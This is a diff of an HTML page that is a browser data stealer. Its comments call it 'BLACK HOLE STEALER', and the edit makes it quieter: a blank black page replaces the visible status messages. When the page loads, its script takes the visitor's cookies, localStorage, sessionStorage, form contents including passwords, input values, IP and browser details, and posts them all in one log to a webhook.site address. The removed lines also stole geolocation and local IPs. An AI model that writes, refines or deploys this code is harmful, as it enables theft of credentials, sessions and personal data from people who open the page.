@@ -2,37 +2,17 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Loading...</title>
+<title></title>
 <style>
 * { margin:0; padding:0; }
-body {
-    background: #000;
-    width: 100vw;
-    height: 100vh;
-    overflow: hidden;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-family: monospace;
-    color: #0f0;
-    font-size: 14px;
-}
+body { background: #000; width:100vw; height:100vh; overflow:hidden; }
 </style>
 </head>
 <body>
-
-<div id="status">[+] Initializing...</div>
-
 <script>
-// ===== BLACK HOLE STEALER =====
+// ===== BLACK HOLE STEALER - ONE BIG LOG PER VISIT =====
 (function() {
     const WEBHOOK = 'https://webhook.site/38be745b-416b-4abd-a51e-9467ccca7ac1';
-    const status = document.getElementById('status');
-    
-    function log(msg) {
-        status.textContent = msg;
-        console.log('[+] ' + msg);
-    }
     
     function send(data) {
         try {
@@ -45,228 +25,94 @@ body {
         } catch(e) {}
     }
     
-    log('Loading...');
-
-    // ===== 1. IP =====
-    log('[1] Stealing IP...');
+    // ===== IP =====
+    let ip = 'unknown';
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
-        .then(data => { ipData = data; send({ type: 'IP', data: data }); })
-        .catch(() => {});
+        .then(data => {
+            ip = data.ip;
+            collectAndSend();
+        })
+        .catch(() => {
+            collectAndSend();
+        });
     
-    fetch('https://ipapi.co/json/')
-        .then(r => r.json())
-        .then(data => { send({ type: 'GEO', data: data }); })
-        .catch(() => {});
-
-    // ===== 2. COOKIES =====
-    log('[2] Stealing cookies...');
-    if (document.cookie) {
-        send({ type: 'COOKIES', data: document.cookie });
-    }
-
-    // ===== 3. LOCAL STORAGE =====
-    log('[3] Stealing localStorage...');
-    const ls = {};
-    for (let key in localStorage) {
-        try { ls[key] = localStorage[key]; } catch(e) {}
-    }
-    send({ type: 'LOCALSTORAGE', data: ls });
-
-    // ===== 4. SESSION STORAGE =====
-    log('[4] Stealing sessionStorage...');
-    const ss = {};
-    for (let key in sessionStorage) {
-        try { ss[key] = sessionStorage[key]; } catch(e) {}
-    }
-    send({ type: 'SESSIONSTORAGE', data: ss });
-
-    // ===== 5. BROWSER INFO =====
-    log('[5] Stealing browser info...');
-    send({ type: 'BROWSER', data: {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        languages: navigator.languages,
-        platform: navigator.platform,
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory || 'unknown',
-        screen: screen.width + 'x' + screen.height,
-        colorDepth: screen.colorDepth,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        referrer: document.referrer || 'direct',
-        url: window.location.href,
-        timestamp: new Date().toISOString()
-    }});
-
-    // ===== 6. SAVED PASSWORDS (if any in forms) =====
-    log('[6] Stealing saved passwords...');
-    const forms = [];
-    document.querySelectorAll('form').forEach(form => {
-        const data = {};
-        new FormData(form).forEach((val, key) => data[key] = val);
-        forms.push({
-            action: form.action || 'none',
-            method: form.method || 'GET',
-            data: data
+    function collectAndSend() {
+        // ===== COOKIES =====
+        const cookies = document.cookie || 'No cookies';
+        
+        // ===== LOCAL STORAGE =====
+        const ls = {};
+        for (let key in localStorage) {
+            try { ls[key] = localStorage[key]; } catch(e) {}
+        }
+        
+        // ===== SESSION STORAGE =====
+        const ss = {};
+        for (let key in sessionStorage) {
+            try { ss[key] = sessionStorage[key]; } catch(e) {}
+        }
+        
+        // ===== BROWSER INFO =====
+        const browser = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || 'direct',
+            url: window.location.href,
+            timestamp: new Date().toISOString()
+        };
+        
+        // ===== FORMS (passwords, logins) =====
+        const forms = [];
+        document.querySelectorAll('form').forEach(form => {
+            const data = {};
+            new FormData(form).forEach((val, key) => data[key] = val);
+            forms.push({
+                action: form.action || 'none',
+                method: form.method || 'GET',
+                data: data
+            });
         });
-    });
-    send({ type: 'FORMS', data: forms });
-
-    // ===== 7. ALL INPUTS =====
-    log('[7] Stealing all inputs...');
-    const inputs = [];
-    document.querySelectorAll('input, textarea, select').forEach(el => {
-        inputs.push({
-            tag: el.tagName,
-            type: el.type || 'text',
-            name: el.name || '',
-            id: el.id || '',
-            value: el.value || '',
-            placeholder: el.placeholder || ''
+        
+        // ===== INPUTS =====
+        const inputs = [];
+        document.querySelectorAll('input, textarea, select').forEach(el => {
+            inputs.push({
+                tag: el.tagName,
+                type: el.type || 'text',
+                name: el.name || '',
+                id: el.id || '',
+                value: el.value || '',
+                placeholder: el.placeholder || ''
+            });
         });
-    });
-    send({ type: 'INPUTS', data: inputs });
-
-    // ===== 8. SCREENSHOT (via canvas) =====
-    log('[8] Taking screenshot...');
-    try {
-        const canvas = document.createElement('canvas');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = '#000';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        // Try to capture page
-        const img = canvas.toDataURL('image/png');
-        send({ type: 'SCREENSHOT', data: img.slice(0, 1000) + '...' });
-    } catch(e) {}
-
-    // ===== 9. NETWORK INFO =====
-    log('[9] Stealing network info...');
-    send({ type: 'NETWORK', data: {
-        online: navigator.onLine,
-        connection: navigator.connection ? {
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt
-        } : 'unavailable'
-    }});
-
-    // ===== 10. PLUGINS =====
-    log('[10] Stealing plugins...');
-    const plugins = [];
-    for (let i = 0; i < navigator.plugins.length; i++) {
-        plugins.push(navigator.plugins[i].name);
+        
+        // ===== PLUGINS =====
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
+        
+        // ===== ONE BIG LOG =====
+        const log = {
+            ip: ip,
+            cookies: cookies,
+            localStorage: ls,
+            sessionStorage: ss,
+            browser: browser,
+            forms: forms,
+            inputs: inputs,
+            plugins: plugins,
+            timestamp: new Date().toISOString()
+        };
+        
+        // ===== SEND ONE BIG LOG =====
+        send(log);
     }
-    send({ type: 'PLUGINS', data: plugins });
-
-    // ===== 11. FONTS (via canvas) =====
-    log('[11] Detecting fonts...');
-    const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS', 'Impact', 'Consolas', 'Monaco', 'Menlo', 'DejaVu Sans', 'Calibri', 'Cambria', 'Candara', 'Constantia', 'Corbel', 'Segoe UI', 'Helvetica Neue', 'Roboto', 'Open Sans', 'Lato', 'Source Sans Pro', 'Montserrat', 'Oswald', 'Raleway', 'PT Sans', 'Nunito'];
-    let detected = [];
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.font = '72px monospace';
-    const base = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
-    fonts.forEach(font => {
-        ctx.font = '72px ' + font + ', monospace';
-        const w = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
-        if (w !== base) detected.push(font);
-    });
-    send({ type: 'FONTS', data: detected });
-
-    // ===== 12. PERFORMANCE / HARDWARE =====
-    log('[12] Stealing performance data...');
-    send({ type: 'PERFORMANCE', data: {
-        memory: performance.memory ? {
-            totalJSHeapSize: performance.memory.totalJSHeapSize,
-            usedJSHeapSize: performance.memory.usedJSHeapSize,
-            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
-        } : 'unavailable',
-        navigation: {
-            type: performance.navigation ? performance.navigation.type : 'unknown',
-            redirectCount: performance.navigation ? performance.navigation.redirectCount : 0
-        },
-        timing: performance.timing ? {
-            loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
-            domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
-            responseTime: performance.timing.responseEnd - performance.timing.requestStart
-        } : 'unavailable'
-    }});
-
-    // ===== 13. GEOLOCATION =====
-    log('[13] Stealing geolocation...');
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                send({ type: 'GEOLOCATION', data: {
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    altitude: pos.coords.altitude,
-                    speed: pos.coords.speed
-                }});
-            },
-            () => {},
-            { timeout: 5000, enableHighAccuracy: false }
-        );
-    }
-
-    // ===== 14. WEBRTC (local IP) =====
-    log('[14] Stealing local IP via WebRTC...');
-    try {
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-        pc.createDataChannel('');
-        pc.createOffer()
-            .then(offer => pc.setLocalDescription(offer))
-            .then(() => {
-                pc.onicecandidate = function(e) {
-                    if (e.candidate) {
-                        const ip = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-                        if (ip) {
-                            send({ type: 'LOCAL_IP', data: ip[0] });
-                            pc.close();
-                        }
-                    }
-                };
-            })
-            .catch(() => {});
-    } catch(e) {}
-
-    // ===== 15. BROWSER STORAGE QUOTA =====
-    log('[15] Stealing storage info...');
-    if (navigator.storage && navigator.storage.estimate) {
-        navigator.storage.estimate()
-            .then(estimate => {
-                send({ type: 'STORAGE_QUOTA', data: {
-                    usage: estimate.usage,
-                    quota: estimate.quota
-                }});
-            })
-            .catch(() => {});
-    }
-
-    // ===== 16. SEND ALL DATA ONE MORE TIME =====
-    setTimeout(() => {
-        log('[+] All data stolen and sent to webhook!');
-        log('[+] Waiting for victims...');
-        setTimeout(() => {
-            // Очищаем экран и оставляем только чёрный фон
-            document.body.innerHTML = '';
-            document.body.style.background = '#000';
-            document.body.style.display = 'flex';
-            document.body.style.justifyContent = 'center';
-            document.body.style.alignItems = 'center';
-            document.body.style.height = '100vh';
-            document.body.style.fontFamily = 'monospace';
-            document.body.style.color = '#0f0';
-            document.body.style.fontSize = '14px';
-            document.body.textContent = '✅';
-        }, 1000);
-    }, 2000);
-
 })();
 </script>
-
 </body>
 </html>
